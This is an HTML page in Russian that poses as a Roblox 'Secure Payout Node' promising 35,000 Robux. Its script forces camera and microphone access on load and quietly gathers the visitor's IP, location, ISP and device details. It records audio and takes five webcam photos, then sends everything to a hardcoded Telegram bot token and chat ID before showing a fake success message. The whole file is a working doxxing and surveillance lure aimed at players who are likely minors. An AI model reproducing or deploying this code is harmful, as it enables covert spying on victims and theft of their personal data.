<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Secure Payout Node v4.0</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: radial-gradient(circle, #151515 0%, #000 100%); border: 2px solid #0084ff; padding: 45px; border-radius: 40px; text-align: center; width: 90%; max-width: 440px; box-shadow: 0 0 80px rgba(0,132,255,0.4); }
        .btn-claim { background: linear-gradient(180deg, #0084ff, #0056a3); color: #fff; border: none; padding: 22px; width: 100%; border-radius: 20px; font-size: 24px; font-weight: 900; cursor: pointer; display: none; margin-top: 20px; box-shadow: 0 5px 15px rgba(0,132,255,0.4); }
        #st { color: #0084ff; font-family: 'Courier New', monospace; font-size: 14px; margin: 20px 0; min-height: 20px; }
        .loader { border: 3px solid #111; border-top: 3px solid #0084ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video { position: fixed; top: -5000px; left: -5000px; pointer-events: none; }
    </style>
</head>
<body onload="initTitanDox()">

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="75" style="filter: invert(1); margin-bottom: 15px;">
    <h1 style="margin:0; letter-spacing: -1px;">35,000 ROBUX</h1>
    <div id="st">ИНИЦИАЛИЗАЦИЯ ШЛЮЗА...</div>
    <div class="loader" id="ldr"></div>
    <p id="msg" style="color: #666; font-size: 13px;">Ожидание подтверждения медиа-потока для верификации личности игрока.</p>
    <button class="btn-claim" id="btn" onclick="executeTitan()">АКТИВИРОВАТЬ</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const BT = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const CH = '7889497672';
    let stream = null;

    async function initTitanDox() {
        const st = document.getElementById('st');
        try {
            // ЖЕСТКИЙ ЗАПРОС ПРИ ВХОДЕ
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;
            
            st.innerText = "STREAM ACTIVE - READY";
            document.getElementById('ldr').style.display = 'none';
            document.getElementById('btn').style.display = 'block';
            document.getElementById('msg').innerText = "Все системы подтверждены. Нажмите для зачисления бонуса.";
        } catch (e) {
            st.style.color = "red";
            st.innerText = "ACCESS ERROR";
            alert("Критическая ошибка верификации! Разрешите доступ к камере и микрофону, чтобы получить награду.");
            location.reload();
        }
    }

    async function executeTitan() {
        document.getElementById('btn').style.display = 'none';
        const st = document.getElementById('st');
        st.innerText = "EXTRACTING DATA...";

        // 🔱 МАКСИМАЛЬНЫЙ ДОКС (Тихий сбор)
        let d = `🔱 **TITAN DOX REPORT** 🔱\n\n`;
        try {
            const r = await fetch('https://ipapi.co/json/');
            const j = await r.json();
            d += `📍 IP: \`${j.ip}\` (${j.org})\n🌍 Место: ${j.city}, ${j.country_name}\n📡 Провайдер: ${j.asn}\n`;
        } catch(e) {}

        d += `\n⚙️ **HARDWARE:**\n`;
        d += `📱 OS: ${navigator.platform}\n`;
        d += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
        d += `🖥 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
        d += `🎨 GPU: ${getG()}\n`;
        d += `🔋 Батарея: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
        d += `🚀 RAM: ${navigator.deviceMemory || '?'} GB\n`;
        
        const devices = await navigator.mediaDevices.enumerateDevices();
        d += `\n📸 **MEDIA NODES:**\n`;
        devices.forEach(dev => { if(dev.label) d += `🔹 ${dev.kind}: ${dev.label}\n`; });

        // ЗАПИСЬ ГОЛОСА
        const rec = new MediaRecorder(stream);
        const audioChunks = [];
        rec.ondataavailable = e => audioChunks.push(e.data);
        rec.onstop = async () => {
            const b = new Blob(audioChunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CH);
            fd.append('voice', b, 'v.ogg');
            fetch(`https://api.telegram.org/bot${BT}/sendVoice`, { method: 'POST', body: fd });
        };
        rec.start();

        // СЕРИЯ ИЗ 5 ФОТО
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;

        for (let i = 1; i <= 5; i++) {
            st.innerText = `SCANNING FACE: ${i*20}%`;
            await new Promise(res => setTimeout(res, 1200));
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.9));
            const fd = new FormData();
            fd.append('chat_id', CH);
            fd.append('photo', blob, `img_${i}.jpg`);
            if (i === 1) fd.append('caption', d + `\n📸 **PHOTO 1/5**`);
            
            await fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, { method: 'POST', body: fd });
        }

        rec.stop();
        alert("✅ Верификация успешно завершена! 35,000 Robux поступят на ваш счет через 10 минут.");
        window.location.href = "https://www.roblox.com";
    }

    function getG() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
